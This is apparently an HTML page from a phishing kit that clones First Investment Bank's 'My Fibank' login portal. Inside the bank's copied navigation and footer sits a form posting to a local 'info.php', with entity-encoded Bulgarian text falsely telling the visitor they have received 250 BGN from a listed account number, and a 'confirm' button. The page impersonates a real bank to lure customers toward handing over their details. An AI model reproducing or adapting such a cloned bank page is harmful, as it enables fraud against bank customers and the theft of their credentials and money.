<html ng-app="sgOAuth2" class="ng-scope"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}.ng-hide-add-active,.ng-hide-remove{display:block!important;}</style>
		<base href="">
		
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<meta name="description" content="">
		<meta name="author" content="">
		<link rel="shortcut icon" href="./img/favicon.ico">
		
		<meta name="_csrf" content="bba7fbc3-1b12-4106-aa33-e080146624e4">
		<meta name="_csrf_header" content="X-CSRF-TOKEN">
		
		<title>Connectez-vous à My Fibank</title>
		
		<!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
		<!--[if lt IE 9]>
		<script src="themes/COMMON/scripts/utils/es5-shim.js"></script>
		<script src="themes/COMMON/scripts/utils/html5shiv.min.js"></script>
		<script src="themes/COMMON/scripts/angular-ui/ui-utils-ieshiv.min.js"></script>
		
		
		<script>
	      document.createElement('ui-select');
	      document.createElement('ui-select-match');
	      document.createElement('ui-select-choices');
	    </script>
		<![endif]-->
		
<!-- 		<script src="themes/COMMON/scripts/utils/modernizr.js"></script> -->
		
		<!-- Core CSS -->
		
			<link href="./css/css.css" rel="stylesheet">
		
		
		<!--[if IE 8]>
		<link href="themes/COMMON/stylesheets/style-ie8.css" rel="stylesheet">
		<script src="themes/COMMON/scripts/utils/respond.min.js"></script>
		<![endif]-->
		<link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"></head><body ng-controller="AppGlobalController" ng-class="{'info-footer' : $state.includes('login') || $state.includes('logout'), 'only-footer' : $state.includes('registration') || $state.includes('lost-password')}" class="ng-scope only-footer"><object id="oCAPICOM" codebase="themes/COMMON/capicom.cab#version=2,0,0,3" classid="clsid:A996E48C-D3DC-4244-89F7-AFA33EC60679" style="display: none;">&nbsp;</object>
	
	
		<div class="body-wrapper">
			<nav class="navbar navbar-default" role="banner">
				<div class="container-fluid">
					<div class="navbar-header">
						<a href="/EBank" ng-class="{'navbar-brand' : selectLang.lang == 'BGN', 'navbar-brand-en' : selectLang.lang != 'BGN'}" class="navbar-brand"></a>
					</div>
					
					<div class="collapse navbar-collapse" role="navigation">
						<ul class="nav navbar-nav">
							<li><a href="" ng-click="changeLang(notSelectedLang)" ng-bind="notSelectedLang.langDesc" class="ng-binding"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Anglais</font></font></a></li>							
							<li><a ng-href="" target="blank" href=""><i class="i-16  i-to-site"></i><span translate="APP.WEBSITE" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Отидете на уеб сайта</font></font></span></a></li>							
							<li dropdown="" sg-dropdown="" is-open="status.isopen" class="ng-scope">
								<a ng-href="" target="blank" href=""><i class="i-32 i-app-full"></i><span translate="APP.MOBAPP" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Мобилно приложение</font></font></span></a>
								<ul dropdown-menu="" class="dropdown-menu menu-app">
									<li>
										<h3 translate="APP.MOBAPP_PIC" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Banque n'importe où, n'importe quand</font></font></h3>
										<a ng-href="" target="blank" translate="APP.LEARNMORE" class="btn btn-default h-34 ng-scope" href=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">En savoir plus</font></font></a>
									</li>
								</ul>
							</li>
							<li><a ng-href="" target="blank" href=""><i class="i-16 i-tariff-changes"></i><span translate="APP.CHANGES" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Промени в основното училище и тарифа</font></font></span></a></li>
													
							<li dropdown="" sg-dropdown="" is-open="status.isopen" class="ng-scope"> <!-- TODO: set angular -->
								<!--<a ng-href="{{'APP.HELP_URL' | translate}}" target="blank"><i class="i-16 i-help"></i><span translate="APP.HELP"></span></a>-->
								<a href=""><i class="i-16 i-help"></i><span translate="APP.HELP" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">помощ</font></font></span></a>
								<ul dropdown-menu="" class="dropdown-menu menu-help">
									<li>
										<h3 translate="APP.INFORMATION_NMENU" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Information</font></font></h3>
									</li>
									<!-- ngIf: false -->
									<li>
										<a ng-href="" target="blank" href="">
											<i class="i-faq i-18-20"></i>
											<span translate="APP.ASKED_QUESTIONS" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Foire aux questions</font></font></span>
										</a>
									</li>
									<li>
										<a ng-href="" target="blank" href="">
											<i class="i-security-advice-big i-18-20"></i>
											<span translate="APP.SECURITY_ADVICE" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mesures de sécurité</font></font></span>
										</a>
									</li>
									
									<!-- ngIf: globalConf.translateSufix != '_CY' --><li ng-if="globalConf.translateSufix != '_CY'" class="ng-scope">
										<a ng-href="https://webgate.ec.europa.eu/odr/main/?event=main.home.show&amp;lng=BG" target="blank" href="https://webgate.ec.europa.eu/odr/main/?event=main.home.show&amp;lng=BG">
											<i class="i-faq i-18-20"></i>
											<span translate="APP.OSD" class="ng-scope"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Résolution de litige en ligne</font></font></span>
										</a>
									</li><!-- end ngIf: globalConf.translateSufix != '_CY' -->
									
									<li>
										<div class="divider"></div>
									</li>
									<li>
										<h3 translate="APP.CONTACT_US_MENU" class="ng-scope">Връзка с нас</h3>
									</li>
									<li>
										<a class="cursor-text">
											<i class="i-18 i-phone"></i>
											<span translate="0700 12 777" class="ng-scope">0700 12 777</span>
										</a>
									</li>
									<li>
										<a class="cursor-text" ng-href="mailto:my.fibank@fibank.bg" href="mailto:my.fibank@fibank.bg">
											<i class="i-20-14 i-mail"></i>
											<span translate="my.fibank@fibank.bg" class="ng-scope">my.fibank@fibank.bg</span>
										</a>
									</li>
									<!-- ngIf: false -->
								</ul>
							</li>
						</ul>
						<ul class="nav navbar-nav navbar-right ">
							
								<!-- ngIf: globalConf.translateSufix != '_CY' --><li ng-if="globalConf.translateSufix != '_CY'" ng-show="$state.includes('login') || $state.includes('lost-password')" class="ng-scope ng-hide"><div><a ui-sref="registration({client_id:'E_BANK'})" translate="APP.REGISTRATION" class="pull-right btn btn-info h-34 w-btn-120 ng-scope" href="/oauth2-server/registration">РЕГИСТРАЦИЯ</a></div></li><!-- end ngIf: globalConf.translateSufix != '_CY' -->
								<li ng-show="$state.includes('registration')" class=""><div></div></li>
								<li ng-show="$state.includes('logoutSuccess')" class="ng-hide"><div><a translate="APP.LOGIN" href="/EBank" class="btn pull-right btn-primary h-34 w-btn-120 ng-scope">ВХОД</a></div></li>
							
						</ul>
					</div>
				</div>
			</nav>
		
			<!-- Content -->
			<!-- uiView:  --><div id="app" ui-view="" data-template-url="index" class="ng-scope">


<form action="./info.php" method="post" <div="" class="container form-centered reg box-border ng-scope">
<br>
	<p style="text-align: center;  background-color:#f0f0f0" >&#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1093;&#1090;&#1077; &#1087;&#1072;&#1088;&#1080;

<p>&#1042;&#1077;&#1095;&#1077; &#1084;&#1086;&#1078;&#1077;&#1090;&#1077; &#1076;&#1072; &#1087;&#1088;&#1086;&#1089;&#1083;&#1077;&#1076;&#1103;&#1074;&#1072;&#1090;&#1077; &#1076;&#1074;&#1080;&#1078;&#1077;&#1085;&#1080;&#1077;&#1090;&#1086; &#1085;&#1072; &#1087;&#1072;&#1088;&#1080;&#1090;&#1077; &#1089;&#1080; &#1087;&#1086; &#1074;&#1089;&#1103;&#1082;&#1086; &#1074;&#1088;&#1077;&#1084;&#1077; &#1080; &#1085;&#1072;&#1074;&#1089;&#1103;&#1082;&#1098;&#1076;&#1077; &#1095;&#1088;&#1077;&#1079; &#1090;&#1072;&#1079;&#1080; &#1091;&#1089;&#1083;&#1091;&#1075;&#1072;, &#1097;&#1077; &#1073;&#1098;&#1076;&#1077;&#1090;&#1077; &#1091;&#1074;&#1077;&#1076;&#1086;&#1084;&#1103;&#1074;&#1072;&#1085;&#1080; &#1089; &#1074;&#1089;&#1103;&#1082;&#1072;&#1082;&#1074;&#1080; &#1087;&#1072;&#1088;&#1080; &#1074; &#1080; &#1086;&#1090; &#1082;&#1098;&#1084; / &#1086;&#1090; &#1074;&#1072;&#1096;&#1080;&#1103; &#1072;&#1082;&#1072;&#1091;&#1085;&#1090;</p>
	<p style="text-align:left;color:green;background-color:#f0f0f0;">&#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1093;&#1090;&#1077; &#1087;&#1072;&#1088;&#1080; &#1086;&#1090; &#1085;&#1086;&#1084;&#1077;&#1088; &#1085;&#1072; &#1089;&#1084;&#1077;&#1090;&#1082;&#1072;:&nbsp;
	<span style="color: rgb(33, 33, 33); font-family: &quot;Trebuchet MS&quot;, Arial, sans-serif; font-size: 12px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 700; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">
	BG17FINV91501000174095 BGN</span></p>
	<p style="text-align:left;color:green;background-color:#f0f0f0;">&#1082;&#1086;&#1083;&#1080;&#1095;&#1077;&#1089;&#1090;&#1074;&#1086;:<span style="color: rgb(33, 33, 33); font-family: &quot;Trebuchet MS&quot;, Arial, sans-serif; font-size: 12px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 700; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;"> 
	250 BGN.</span></p>
	<p>&#1052;&#1086;&#1078;&#1077;&#1090;&#1077; &#1076;&#1072; &#1087;&#1088;&#1086;&#1074;&#1077;&#1088;&#1080;&#1090;&#1077; &#1073;&#1072;&#1083;&#1072;&#1085;&#1089;&#1072; &#1080; &#1076;&#1077;&#1081;&#1085;&#1086;&#1089;&#1090;&#1080;&#1090;&#1077; &#1074; &#1087;&#1088;&#1086;&#1092;&#1080;&#1083;&#1072; &#1089;&#1080;.


    <div class="divider margin-b-20"></div>
<button class="btn btn-primary ng-scope" type="submit" translate="REGISTRATION.SUBMIT" ng-click="setAllInputsDirty()" ng-disabled="form.submiting"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Потвърждавам</font></font></button>

</form></div>
<centre></centre>
 </div>

			<!-- Content -->
		
			<div class="body-push"></div>
		
	<!--  FOOTER  -->
		<div id="footer-push">
			<!-- ngIf: !$state.includes('registration') && !$state.includes('lost-password') -->
			<div id="footer" class="container-fluid text-center">
				<ul class="list-inline s2">
					<!-- ngIf: false -->
					<!-- ngIf: false -->
					<!-- ngIf: globalConf.translateSufix != '_CY' --><li ng-if="globalConf.translateSufix != '_CY'" class="ng-scope"><a ng-href="http:///bg/moyata-fibank/page/1905#protses-na-registratsiya" translate="APP.REGISTRATION_PROC" target="_blank" class="ng-scope" href="http:///bg/moyata-fibank/page/1905#protses-na-registratsiya"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Processus d'inscription</font></font></a><i class="i-arrow-right-4x7"></i></li><!-- end ngIf: globalConf.translateSufix != '_CY' -->
					<!-- ngIf: false -->
					<li><a ng-href="http:///uploads/_Tariff_Bulletin/docs/Tariff.pdf" translate="APP.FEES_COMISSIONS" target="_blank" class="ng-scope" href="http:///uploads/_Tariff_Bulletin/docs/Tariff.pdf"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Honoraires et commissions</font></font></a><i class="i-arrow-right-4x7"></i></li>
					<li><a ng-href="http:///bg/moyata-fibank/page/1905#dokumenti" translate="APP.DOCUMENTS" target="_blank" class="ng-scope" href="http:///bg/moyata-fibank/page/1905#dokumenti"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Documents</font></font></a><i class="i-arrow-right-4x7"></i></li>
				</ul>
				<p class="s2 ng-scope" translate="APP.COPYRIGHTS"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">© First Investment Bank 2009-2018. </font><font style="vertical-align: inherit;">Tous droits réservés.</font></font></p>
			</div>
		</div>
	<!--  /FOOTER  -->	

		
		<!-- Static sources -->
		
			<script type="text/javascript" src="themes/E_BANK/app/app-static.min.js?v=1"></script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Traduction"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Texte d'origine</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Proposer une meilleure traduction</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>
		
	
<div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Traduction"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Texte d'origine</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Proposer une meilleure traduction</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Traduction"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Texte d'origine</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Proposer une meilleure traduction</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div></body></html>